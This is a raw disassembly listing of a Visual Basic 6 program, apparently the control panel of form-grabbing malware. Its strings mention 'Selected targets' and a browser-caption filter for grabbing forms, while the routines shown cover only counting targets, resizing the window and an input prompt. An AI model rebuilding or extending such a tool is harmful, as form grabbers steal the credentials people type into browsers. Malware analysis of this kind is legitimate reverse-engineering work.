008B8703: mov var_7C, 00000002h
008B870A: cmp [008F2010h], 00000000h
008B8711: jnz 8B872Eh
008B8713: push 008F2010h
008B8718: push 00433984h
008B871D: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008B8722: mov var_00000108, 008F2010h
008B872C: jmp 8B8738h
008B872E: mov var_00000108, 008F2010h
008B8738: push 00000000h
008B873A: push 00000001h
008B873C: push 00440E48h
008B8741: push 00000000h
008B8743: push 00000018h
008B8745: mov eax, var_00000108
008B874B: mov eax, [eax]
008B874D: mov ecx, var_00000108
008B8753: mov ecx, [ecx]
008B8755: mov ecx, [ecx]
008B8757: push eax
008B8758: call [ecx+00000550h]
008B875E: push eax
008B875F: lea eax, var_34
008B8762: push eax
008B8763: call 00410A84h ; Set (object)
008B8768: push eax
008B8769: lea eax, var_4C
008B876C: push eax
008B876D: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B8772: add esp, 00000010h
008B8775: push eax
008B8776: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B877B: push eax
008B877C: lea eax, var_38
008B877F: push eax
008B8780: call 00410A84h ; Set (object)
008B8785: push eax
008B8786: lea eax, var_5C
008B8789: push eax
008B878A: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B878F: add esp, 00000010h
008B8792: push eax
008B8793: call 00410A90h ; msvbvm60.dll.__vbaI4Var
008B8798: mov var_00000084, eax
008B879E: mov var_0000008C, 00000003h
008B87A8: mov var_00000094, 00000001h
008B87B2: mov var_0000009C, 00000002h
008B87BC: lea eax, var_7C
008B87BF: push eax
008B87C0: lea eax, var_0000008C
008B87C6: push eax
008B87C7: lea eax, var_0000009C
008B87CD: push eax
008B87CE: lea eax, var_000000EC
008B87D4: push eax
008B87D5: lea eax, var_000000DC
008B87DB: push eax
008B87DC: lea eax, var_24
008B87DF: push eax
008B87E0: call 00410A3Ch ; For
008B87E5: mov var_000000FC, eax
008B87EB: lea eax, var_38
008B87EE: push eax
008B87EF: lea eax, var_34
008B87F2: push eax
008B87F3: push 00000002h
008B87F5: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008B87FA: add esp, 0000000Ch
008B87FD: lea eax, var_5C
008B8800: push eax
008B8801: lea eax, var_4C
008B8804: push eax
008B8805: push 00000002h
008B8807: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008B880C: add esp, 0000000Ch
008B880F: jmp 008B895Ch
008B8814: lea eax, var_24
008B8817: mov var_74, eax
008B881A: mov var_7C, 0000400Ch
008B8821: cmp [008F2010h], 00000000h
008B8828: jnz 8B8845h
008B882A: push 008F2010h
008B882F: push 00433984h
008B8834: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008B8839: mov var_0000010C, 008F2010h
008B8843: jmp 8B884Fh
008B8845: mov var_0000010C, 008F2010h
008B884F: push 00000000h
008B8851: push 00000004h
008B8853: push 00440E58h
008B8858: push 00000010h
008B885A: pop eax
008B885B: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008B8860: lea esi, var_7C
008B8863: mov edi, esp
008B8865: movsd 
008B8866: movsd 
008B8867: movsd 
008B8868: movsd 
008B8869: push 00000001h
008B886B: push 00000000h
008B886D: push 00440E48h
008B8872: push 00000000h
008B8874: push 00000018h
008B8876: mov eax, var_0000010C
008B887C: mov eax, [eax]
008B887E: mov ecx, var_0000010C
008B8884: mov ecx, [ecx]
008B8886: mov ecx, [ecx]
008B8888: push eax
008B8889: call [ecx+00000550h]
008B888F: push eax
008B8890: lea eax, var_34
008B8893: push eax
008B8894: call 00410A84h ; Set (object)
008B8899: push eax
008B889A: lea eax, var_4C
008B889D: push eax
008B889E: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B88A3: add esp, 00000010h
008B88A6: push eax
008B88A7: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B88AC: push eax
008B88AD: lea eax, var_38
008B88B0: push eax
008B88B1: call 00410A84h ; Set (object)
008B88B6: push eax
008B88B7: lea eax, var_5C
008B88BA: push eax
008B88BB: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B88C0: add esp, 00000020h
008B88C3: push eax
008B88C4: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B88C9: push eax
008B88CA: lea eax, var_3C
008B88CD: push eax
008B88CE: call 00410A84h ; Set (object)
008B88D3: push eax
008B88D4: lea eax, var_6C
008B88D7: push eax
008B88D8: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B88DD: add esp, 00000010h
008B88E0: push eax
008B88E1: call 004108C8h ; msvbvm60.dll.__vbaBoolVar
008B88E6: sub ax, FFFFh
008B88EA: neg ax
008B88ED: sbb eax, eax
008B88EF: inc eax
008B88F0: neg eax
008B88F2: mov var_000000A0, ax
008B88F9: lea eax, var_3C
008B88FC: push eax
008B88FD: lea eax, var_38
008B8900: push eax
008B8901: lea eax, var_34
008B8904: push eax
008B8905: push 00000003h
008B8907: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008B890C: add esp, 00000010h
008B890F: lea eax, var_6C
008B8912: push eax
008B8913: lea eax, var_5C
008B8916: push eax
008B8917: lea eax, var_4C
008B891A: push eax
008B891B: push 00000003h
008B891D: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008B8922: add esp, 00000010h
008B8925: movsx eax, word ptr var_000000A0
008B892C: test eax, eax
008B892E: jz 8B893Fh
008B8930: mov eax, var_28
008B8933: add eax, 00000001h
008B8936: jo 008B8B61h
008B893C: mov var_28, eax
008B893F: lea eax, var_000000EC
008B8945: push eax
008B8946: lea eax, var_000000DC
008B894C: push eax
008B894D: lea eax, var_24
008B8950: push eax
008B8951: call 00410A36h ; Next
008B8956: mov var_000000FC, eax
008B895C: cmp var_000000FC, 00000000h
008B8963: jnz 008B8814h
008B8969: push 0044A87Ch
008B896E: push 00000000h
008B8970: push 00000003h
008B8972: mov eax, [ebp+08h]
008B8975: mov eax, [eax]
008B8977: push [ebp+08h]
008B897A: call [eax+00000320h]
008B8980: push eax
008B8981: lea eax, var_34
008B8984: push eax
008B8985: call 00410A84h ; Set (object)
008B898A: push eax
008B898B: lea eax, var_4C
008B898E: push eax
008B898F: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B8994: add esp, 00000010h
008B8997: push eax
008B8998: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B899D: push eax
008B899E: lea eax, var_38
008B89A1: push eax
008B89A2: call 00410A84h ; Set (object)
008B89A7: mov var_000000A0, eax
008B89AD: mov var_54, 00000004h
008B89B4: mov var_5C, 00000002h
008B89BB: lea eax, var_3C
008B89BE: push eax
008B89BF: lea eax, var_5C
008B89C2: push eax
008B89C3: mov eax, var_000000A0
008B89C9: mov eax, [eax]
008B89CB: push var_000000A0
008B89D1: call [eax+24h]
008B89D4: fclex 
008B89D6: mov var_000000A4, eax
008B89DC: cmp var_000000A4, 00000000h
008B89E3: jnl 8B8A05h
008B89E5: push 00000024h
008B89E7: push 0044A87Ch
008B89EC: push var_000000A0
008B89F2: push var_000000A4
008B89F8: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B89FD: mov var_00000110, eax
008B8A03: jmp 8B8A0Ch
008B8A05: and var_00000110, 00000000h
008B8A0C: mov eax, var_3C
008B8A0F: mov var_000000A8, eax
008B8A15: push 0045A83Ch ; Selected targets:
008B8A1A: push var_28
008B8A1D: call 00410A1Eh ; msvbvm60.dll.__vbaStrI4
008B8A22: mov edx, eax
008B8A24: lea ecx, var_2C
008B8A27: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008B8A2C: push eax
008B8A2D: call 00410A18h ; &
008B8A32: mov edx, eax
008B8A34: lea ecx, var_30
008B8A37: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008B8A3C: push eax
008B8A3D: mov eax, var_000000A8
008B8A43: mov eax, [eax]
008B8A45: push var_000000A8
008B8A4B: call [eax+00000080h]
008B8A51: fclex 
008B8A53: mov var_000000AC, eax
008B8A59: cmp var_000000AC, 00000000h
008B8A60: jnl 8B8A85h
008B8A62: push 00000080h
008B8A67: push 0044A88Ch
008B8A6C: push var_000000A8
008B8A72: push var_000000AC
008B8A78: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B8A7D: mov var_00000114, eax
008B8A83: jmp 8B8A8Ch
008B8A85: and var_00000114, 00000000h
008B8A8C: lea eax, var_30
008B8A8F: push eax
008B8A90: lea eax, var_2C
008B8A93: push eax
008B8A94: push 00000002h
008B8A96: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
008B8A9B: add esp, 0000000Ch
008B8A9E: lea eax, var_3C
008B8AA1: push eax
008B8AA2: lea eax, var_38
008B8AA5: push eax
008B8AA6: lea eax, var_34
008B8AA9: push eax
008B8AAA: push 00000003h
008B8AAC: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008B8AB1: add esp, 00000010h
008B8AB4: lea eax, var_5C
008B8AB7: push eax
008B8AB8: lea eax, var_4C
008B8ABB: push eax
008B8ABC: push 00000002h
008B8ABE: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008B8AC3: add esp, 0000000Ch
008B8AC6: mov var_04, 00000000h
008B8ACD: push 008B8B42h
008B8AD2: jmp 8B8B13h
008B8AD4: lea eax, var_30
008B8AD7: push eax
008B8AD8: lea eax, var_2C
008B8ADB: push eax
008B8ADC: push 00000002h
008B8ADE: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
008B8AE3: add esp, 0000000Ch
008B8AE6: lea eax, var_3C
008B8AE9: push eax
008B8AEA: lea eax, var_38
008B8AED: push eax
008B8AEE: lea eax, var_34
008B8AF1: push eax
008B8AF2: push 00000003h
008B8AF4: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008B8AF9: add esp, 00000010h
008B8AFC: lea eax, var_6C
008B8AFF: push eax
008B8B00: lea eax, var_5C
008B8B03: push eax
008B8B04: lea eax, var_4C
008B8B07: push eax
008B8B08: push 00000003h
008B8B0A: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008B8B0F: add esp, 00000010h
008B8B12: ret 
End Sub

Private sub Form__8B2FF1
008B2FF1: push ebp
008B2FF2: mov ebp, esp
008B2FF4: sub esp, 00000018h
008B2FF7: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
008B2FFC: mov eax, fs:[00h]
008B3002: push eax
008B3003: mov fs:[00000000h], esp
008B300A: mov eax, 000000E8h
008B300F: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008B3014: push ebx
008B3015: push esi
008B3016: push edi
008B3017: mov var_18, esp
008B301A: mov var_14, 0040EAB8h
008B3021: mov eax, [ebp+08h]
008B3024: and eax, 00000001h
008B3027: mov var_10, eax
008B302A: mov eax, [ebp+08h]
008B302D: and al, FEh
008B302F: mov [ebp+08h], eax
008B3032: mov var_0C, 00000000h
008B3039: mov eax, [ebp+08h]
008B303C: mov eax, [eax]
008B303E: push [ebp+08h]
008B3041: call [eax+04h]
008B3044: mov var_04, 00000001h
008B304B: mov var_04, 00000002h
008B3052: push FFFFFFFFh
008B3054: call 00410A60h ; On Error ...
008B3059: mov var_04, 00000003h
008B3060: push 00000000h
008B3062: push 80010006h
008B3067: mov eax, [ebp+08h]
008B306A: mov eax, [eax]
008B306C: push [ebp+08h]
008B306F: call [eax+00000318h]
008B3075: push eax
008B3076: lea eax, var_24
008B3079: push eax
008B307A: call 00410A84h ; Set (object)
008B307F: push eax
008B3080: lea eax, var_3C
008B3083: push eax
008B3084: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B3089: add esp, 00000010h
008B308C: push 00000000h
008B308E: push 80010006h
008B3093: mov eax, [ebp+08h]
008B3096: mov eax, [eax]
008B3098: push [ebp+08h]
008B309B: call [eax+00000320h]
008B30A1: push eax
008B30A2: lea eax, var_28
008B30A5: push eax
008B30A6: call 00410A84h ; Set (object)
008B30AB: push eax
008B30AC: lea eax, var_4C
008B30AF: push eax
008B30B0: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B30B5: add esp, 00000010h
008B30B8: fldz 
008B30BA: fstp real4 ptr var_54
008B30BD: mov var_5C, 00000004h
008B30C4: and var_74, 00000000h
008B30C8: mov var_7C, 00000002h
008B30CF: lea eax, var_000000D0
008B30D5: push eax
008B30D6: mov eax, [ebp+08h]
008B30D9: mov eax, [eax]
008B30DB: push [ebp+08h]
008B30DE: call [eax+00000080h]
008B30E4: fclex 
008B30E6: mov var_000000D8, eax
008B30EC: cmp var_000000D8, 00000000h
008B30F3: jnl 8B3115h
008B30F5: push 00000080h
008B30FA: push 00446B98h
008B30FF: push [ebp+08h]
008B3102: push var_000000D8
008B3108: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B310D: mov var_000000F4, eax
008B3113: jmp 8B311Ch
008B3115: and var_000000F4, 00000000h
008B311C: fld real4 ptr var_000000D0
008B3122: fsub real4 ptr [0040EAF0h]
008B3128: fstp real4 ptr var_00000094
008B312E: fstsw ax
008B3130: test al, 0Dh
008B3132: jnz 008B3558h
008B3138: mov var_0000009C, 00000004h
008B3142: lea eax, var_000000D4
008B3148: push eax
008B3149: mov eax, [ebp+08h]
008B314C: mov eax, [eax]
008B314E: push [ebp+08h]
008B3151: call [eax+00000088h]
008B3157: fclex 
008B3159: mov var_000000DC, eax
008B315F: cmp var_000000DC, 00000000h
008B3166: jnl 8B3188h
008B3168: push 00000088h
008B316D: push 00446B98h
008B3172: push [ebp+08h]
008B3175: push var_000000DC
008B317B: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B3180: mov var_000000F8, eax
008B3186: jmp 8B318Fh
008B3188: and var_000000F8, 00000000h
008B318F: lea eax, var_3C
008B3192: push eax
008B3193: call 004107EAh ; msvbvm60.dll.__vbaR4Var
008B3198: fsubr real4 ptr var_000000D4
008B319E: fstsw ax
008B31A0: test al, 0Dh
008B31A2: jnz 008B3558h
008B31A8: fstp real4 ptr var_000000FC
008B31AE: lea eax, var_4C
008B31B1: push eax
008B31B2: call 004107EAh ; msvbvm60.dll.__vbaR4Var
008B31B7: fsubr real4 ptr var_000000FC
008B31BD: fsub real4 ptr [0040DF3Ch]
008B31C3: fstp real4 ptr var_000000B4
008B31C9: fstsw ax
008B31CB: test al, 0Dh
008B31CD: jnz 008B3558h
008B31D3: mov var_000000BC, 00000004h
008B31DD: push 00000010h
008B31DF: pop eax
008B31E0: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008B31E5: lea esi, var_5C
008B31E8: mov edi, esp
008B31EA: movsd 
008B31EB: movsd 
008B31EC: movsd 
008B31ED: movsd 
008B31EE: push 00000010h
008B31F0: pop eax
008B31F1: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008B31F6: lea esi, var_7C
008B31F9: mov edi, esp
008B31FB: movsd 
008B31FC: movsd 
008B31FD: movsd 
008B31FE: movsd 
008B31FF: push 00000010h
008B3201: pop eax
008B3202: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008B3207: lea esi, var_0000009C
008B320D: mov edi, esp
008B320F: movsd 
008B3210: movsd 
008B3211: movsd 
008B3212: movsd 
008B3213: push 00000010h
008B3215: pop eax
008B3216: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008B321B: lea esi, var_000000BC
008B3221: mov edi, esp
008B3223: movsd 
008B3224: movsd 
008B3225: movsd 
008B3226: movsd 
008B3227: push 00000004h
008B3229: push 80011002h
008B322E: mov eax, [ebp+08h]
008B3231: mov eax, [eax]
008B3233: push [ebp+08h]
008B3236: call [eax+00000324h]
008B323C: push eax
008B323D: lea eax, var_2C
008B3240: push eax
008B3241: call 00410A84h ; Set (object)
008B3246: push eax
008B3247: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
008B324C: add esp, 0000004Ch
008B324F: lea eax, var_2C
008B3252: push eax
008B3253: lea eax, var_28
008B3256: push eax
008B3257: lea eax, var_24
008B325A: push eax
008B325B: push 00000003h
008B325D: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008B3262: add esp, 00000010h
008B3265: lea eax, var_4C
008B3268: push eax
008B3269: lea eax, var_3C
008B326C: push eax
008B326D: push 00000002h
008B326F: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008B3274: add esp, 0000000Ch
008B3277: mov var_04, 00000004h
008B327E: push 00000000h
008B3280: push 80010006h
008B3285: mov eax, [ebp+08h]
008B3288: mov eax, [eax]
008B328A: push [ebp+08h]
008B328D: call [eax+00000324h]
008B3293: push eax
008B3294: lea eax, var_28
008B3297: push eax
008B3298: call 00410A84h ; Set (object)
008B329D: push eax
008B329E: lea eax, var_4C
008B32A1: push eax
008B32A2: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B32A7: add esp, 00000010h
008B32AA: fldz 
008B32AC: fstp real4 ptr var_54
008B32AF: mov var_5C, 00000004h
008B32B6: push 00000000h
008B32B8: push 80010004h
008B32BD: mov eax, [ebp+08h]
008B32C0: mov eax, [eax]
008B32C2: push [ebp+08h]
008B32C5: call [eax+00000324h]
008B32CB: push eax
008B32CC: lea eax, var_24
008B32CF: push eax
008B32D0: call 00410A84h ; Set (object)
008B32D5: push eax
008B32D6: lea eax, var_3C
008B32D9: push eax
008B32DA: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B32DF: add esp, 00000010h
008B32E2: push eax
008B32E3: call 004107EAh ; msvbvm60.dll.__vbaR4Var
008B32E8: fstp real4 ptr var_00000100
008B32EE: lea eax, var_4C
008B32F1: push eax
008B32F2: call 004107EAh ; msvbvm60.dll.__vbaR4Var
008B32F7: fadd real4 ptr var_00000100
008B32FD: fadd real4 ptr [00402BA8h]
008B3303: fstp real4 ptr var_74
008B3306: fstsw ax
008B3308: test al, 0Dh
008B330A: jnz 008B3558h
008B3310: mov var_7C, 00000004h
008B3317: lea eax, var_000000D0
008B331D: push eax
008B331E: mov eax, [ebp+08h]
008B3321: mov eax, [eax]
008B3323: push [ebp+08h]
008B3326: call [eax+00000080h]
008B332C: fclex 
008B332E: mov var_000000D8, eax
008B3334: cmp var_000000D8, 00000000h
008B333B: jnl 8B335Dh
008B333D: push 00000080h
008B3342: push 00446B98h
008B3347: push [ebp+08h]
008B334A: push var_000000D8
008B3350: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B3355: mov var_00000104, eax
008B335B: jmp 8B3364h
008B335D: and var_00000104, 00000000h
008B3364: fld real4 ptr var_000000D0
008B336A: fsub real4 ptr [0040EAF0h]
008B3370: fstp real4 ptr var_00000094
008B3376: fstsw ax
008B3378: test al, 0Dh
008B337A: jnz 008B3558h
008B3380: mov var_0000009C, 00000004h
008B338A: push 00000010h
008B338C: pop eax
008B338D: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008B3392: lea esi, var_5C
008B3395: mov edi, esp
008B3397: movsd 
008B3398: movsd 
008B3399: movsd 
008B339A: movsd 
008B339B: push 00000010h
008B339D: pop eax
008B339E: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008B33A3: lea esi, var_7C
008B33A6: mov edi, esp
008B33A8: movsd 
008B33A9: movsd 
008B33AA: movsd 
008B33AB: movsd 
008B33AC: push 00000010h
008B33AE: pop eax
008B33AF: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008B33B4: lea esi, var_0000009C
008B33BA: mov edi, esp
008B33BC: movsd 
008B33BD: movsd 
008B33BE: movsd 
008B33BF: movsd 
008B33C0: push 00000003h
008B33C2: push 80011001h
008B33C7: mov eax, [ebp+08h]
008B33CA: mov eax, [eax]
008B33CC: push [ebp+08h]
008B33CF: call [eax+00000318h]
008B33D5: push eax
008B33D6: lea eax, var_2C
008B33D9: push eax
008B33DA: call 00410A84h ; Set (object)
008B33DF: push eax
008B33E0: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
008B33E5: add esp, 0000003Ch
008B33E8: lea eax, var_2C
008B33EB: push eax
008B33EC: lea eax, var_28
008B33EF: push eax
008B33F0: lea eax, var_24
008B33F3: push eax
008B33F4: push 00000003h
008B33F6: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008B33FB: add esp, 00000010h
008B33FE: lea eax, var_4C
008B3401: push eax
008B3402: lea eax, var_3C
008B3405: push eax
008B3406: push 00000002h
008B3408: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008B340D: add esp, 0000000Ch
008B3410: mov var_04, 00000005h
008B3417: push 00000000h
008B3419: push 80010003h
008B341E: mov eax, [ebp+08h]
008B3421: mov eax, [eax]
008B3423: push [ebp+08h]
008B3426: call [eax+0000031Ch]
008B342C: push eax
008B342D: lea eax, var_28
008B3430: push eax
008B3431: call 00410A84h ; Set (object)
008B3436: push eax
008B3437: lea eax, var_4C
008B343A: push eax
008B343B: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B3440: add esp, 00000010h
008B3443: push 00000000h
008B3445: push 80010005h
008B344A: mov eax, [ebp+08h]
008B344D: mov eax, [eax]
008B344F: push [ebp+08h]
008B3452: call [eax+00000318h]
008B3458: push eax
008B3459: lea eax, var_24
008B345C: push eax
008B345D: call 00410A84h ; Set (object)
008B3462: push eax
008B3463: lea eax, var_3C
008B3466: push eax
008B3467: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B346C: add esp, 00000010h
008B346F: push eax
008B3470: call 004107EAh ; msvbvm60.dll.__vbaR4Var
008B3475: fstp real4 ptr var_00000108
008B347B: lea eax, var_4C
008B347E: push eax
008B347F: call 004107EAh ; msvbvm60.dll.__vbaR4Var
008B3484: fsubr real4 ptr var_00000108
008B348A: fsub real4 ptr [00402BA4h]
008B3490: fstp real4 ptr var_54
008B3493: fstsw ax
008B3495: test al, 0Dh
008B3497: jnz 008B3558h
008B349D: mov var_5C, 00000004h
008B34A4: push 00000010h
008B34A6: pop eax
008B34A7: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008B34AC: lea esi, var_5C
008B34AF: mov edi, esp
008B34B1: movsd 
008B34B2: movsd 
008B34B3: movsd 
008B34B4: movsd 
008B34B5: push 80010005h
008B34BA: mov eax, [ebp+08h]
008B34BD: mov eax, [eax]
008B34BF: push [ebp+08h]
008B34C2: call [eax+0000031Ch]
008B34C8: push eax
008B34C9: lea eax, var_2C
008B34CC: push eax
008B34CD: call 00410A84h ; Set (object)
008B34D2: push eax
008B34D3: call 00410A72h ; msvbvm60.dll.__vbaLateIdSt
008B34D8: lea eax, var_2C
008B34DB: push eax
008B34DC: lea eax, var_28
008B34DF: push eax
008B34E0: lea eax, var_24
008B34E3: push eax
008B34E4: push 00000003h
008B34E6: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008B34EB: add esp, 00000010h
008B34EE: lea eax, var_4C
008B34F1: push eax
008B34F2: lea eax, var_3C
008B34F5: push eax
008B34F6: push 00000002h
008B34F8: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008B34FD: add esp, 0000000Ch
008B3500: mov var_10, 00000000h
008B3507: wait 
008B3508: push 008B3539h
008B350D: jmp 8B3538h
008B350F: lea eax, var_2C
008B3512: push eax
008B3513: lea eax, var_28
008B3516: push eax
008B3517: lea eax, var_24
008B351A: push eax
008B351B: push 00000003h
008B351D: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008B3522: add esp, 00000010h
008B3525: lea eax, var_4C
008B3528: push eax
008B3529: lea eax, var_3C
008B352C: push eax
008B352D: push 00000002h
008B352F: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008B3534: add esp, 0000000Ch
008B3537: ret 
End Sub

Private sub Form__8B355D
008B355D: push ebp
008B355E: mov ebp, esp
008B3560: sub esp, 0000000Ch
008B3563: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
008B3568: mov eax, fs:[00h]
008B356E: push eax
008B356F: mov fs:[00000000h], esp
008B3576: push 00000010h
008B3578: pop eax
008B3579: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008B357E: push ebx
008B357F: push esi
008B3580: push edi
008B3581: mov var_0C, esp
008B3584: mov var_08, 0040EAF8h
008B358B: mov eax, [ebp+08h]
008B358E: and eax, 00000001h
008B3591: mov var_04, eax
008B3594: mov eax, [ebp+08h]
008B3597: and al, FEh
008B3599: mov [ebp+08h], eax
008B359C: mov eax, [ebp+08h]
008B359F: mov eax, [eax]
008B35A1: push [ebp+08h]
008B35A4: call [eax+04h]
008B35A7: push 00000000h
008B35A9: mov eax, [ebp+08h]
008B35AC: mov eax, [eax]
008B35AE: push [ebp+08h]
008B35B1: call [eax+000001BCh]
008B35B7: fclex 
008B35B9: mov var_18, eax
008B35BC: cmp var_18, 00000000h
008B35C0: jnl 8B35DCh
008B35C2: push 000001BCh
008B35C7: push 00446B98h
008B35CC: push [ebp+08h]
008B35CF: push var_18
008B35D2: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B35D7: mov var_24, eax
008B35DA: jmp 8B35E0h
008B35DC: and var_24, 00000000h
008B35E0: mov eax, [ebp+0Ch]
008B35E3: or word ptr [eax], FFFFh
008B35E7: mov var_04, 00000000h
008B35EE: mov eax, [ebp+08h]
008B35F1: mov eax, [eax]
008B35F3: push [ebp+08h]
008B35F6: call [eax+08h]
008B35F9: mov eax, var_04
008B35FC: mov ecx, var_14
008B35FF: mov fs:[00000000h], ecx
008B3606: pop edi
008B3607: pop esi
008B3608: pop ebx
008B3609: leave 
008B360A: retn 0008h
End Sub

Private sub mnuFilter__8B4CA5
008B4CA5: push ebp
008B4CA6: mov ebp, esp
008B4CA8: sub esp, 00000018h
008B4CAB: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
008B4CB0: mov eax, fs:[00h]
008B4CB6: push eax
008B4CB7: mov fs:[00000000h], esp
008B4CBE: mov eax, 00000258h
008B4CC3: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008B4CC8: push ebx
008B4CC9: push esi
008B4CCA: push edi
008B4CCB: mov var_18, esp
008B4CCE: mov var_14, 0040EB98h
008B4CD5: mov eax, [ebp+08h]
008B4CD8: and eax, 00000001h
008B4CDB: mov var_10, eax
008B4CDE: mov eax, [ebp+08h]
008B4CE1: and al, FEh
008B4CE3: mov [ebp+08h], eax
008B4CE6: mov var_0C, 00000000h
008B4CED: mov eax, [ebp+08h]
008B4CF0: mov eax, [eax]
008B4CF2: push [ebp+08h]
008B4CF5: call [eax+04h]
008B4CF8: mov var_04, 00000001h
008B4CFF: mov var_04, 00000002h
008B4D06: push FFFFFFFFh
008B4D08: call 00410A60h ; On Error ...
008B4D0D: mov var_04, 00000003h
008B4D14: mov eax, [ebp+0Ch]
008B4D17: mov ax, [eax]
008B4D1A: mov var_00000200, ax
008B4D21: movsx eax, word ptr var_00000200
008B4D28: mov var_00000220, eax
008B4D2E: cmp var_00000220, 00000000h
008B4D35: jz 8B4D4Eh
008B4D37: cmp var_00000220, 00000002h
008B4D3E: jz 008B6235h
008B4D44: jmp 008B674Dh
008B4D49: jmp 008B674Dh
008B4D4E: mov var_04, 00000005h
008B4D55: mov var_000000F8, 80020004h
008B4D5F: mov var_00000100, 0000000Ah
008B4D69: mov var_000000E8, 80020004h
008B4D73: mov var_000000F0, 0000000Ah
008B4D7D: mov var_000000D8, 80020004h
008B4D87: mov var_000000E0, 0000000Ah
008B4D91: mov var_000000C8, 80020004h
008B4D9B: mov var_000000D0, 0000000Ah
008B4DA5: mov var_000000B8, 80020004h
008B4DAF: mov var_000000C0, 0000000Ah
008B4DB9: mov var_000000A8, 80020004h
008B4DC3: mov var_000000B0, 0000000Ah
008B4DCD: push 00459CE4h ; Enter any word or phrase that refers to caption of the browser
008B4DD2: push 00441264h ; vbCrLf
008B4DD7: call 00410A18h ; &
008B4DDC: mov edx, eax
008B4DDE: lea ecx, var_48
008B4DE1: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008B4DE6: push eax
008B4DE7: push 00441264h ; vbCrLf
008B4DEC: call 00410A18h ; &
008B4DF1: mov edx, eax
008B4DF3: lea ecx, var_4C
008B4DF6: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008B4DFB: push eax
008B4DFC: push 00459DB8h ; Note: The form grabber will only grab forms from browsers having the entered text in its caption.
008B4E01: call 00410A18h ; &
008B4E06: mov var_00000098, eax
008B4E0C: mov var_000000A0, 00000008h
008B4E16: lea eax, var_00000100
008B4E1C: push eax
008B4E1D: lea eax, var_000000F0
008B4E23: push eax
008B4E24: lea eax, var_000000E0
008B4E2A: push eax
008B4E2B: lea eax, var_000000D0
008B4E31: push eax
008B4E32: lea eax, var_000000C0
008B4E38: push eax
008B4E39: lea eax, var_000000B0
008B4E3F: push eax
008B4E40: lea eax, var_000000A0
008B4E46: push eax
008B4E47: call 00410994h ; InputBox
008B4E4C: mov edx, eax
008B4E4E: lea ecx, var_34
008B4E51: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008B4E56: lea eax, var_4C
008B4E59: push eax
008B4E5A: lea eax, var_48
008B4E5D: push eax
008B4E5E: push 00000002h
008B4E60: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
008B4E65: add esp, 0000000Ch
008B4E68: lea eax, var_00000100
008B4E6E: push eax
008B4E6F: lea eax, var_000000F0
008B4E75: push eax
008B4E76: lea eax, var_000000E0
008B4E7C: push eax
008B4E7D: lea eax, var_000000D0
008B4E83: push eax
008B4E84: lea eax, var_000000C0
008B4E8A: push eax
008B4E8B: lea eax, var_000000B0
008B4E91: push eax
008B4E92: lea eax, var_000000A0
008B4E98: push eax
008B4E99: push 00000007h
008B4E9B: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008B4EA0: add esp, 00000020h
008B4EA3: mov var_04, 00000006h
008B4EAA: push var_34
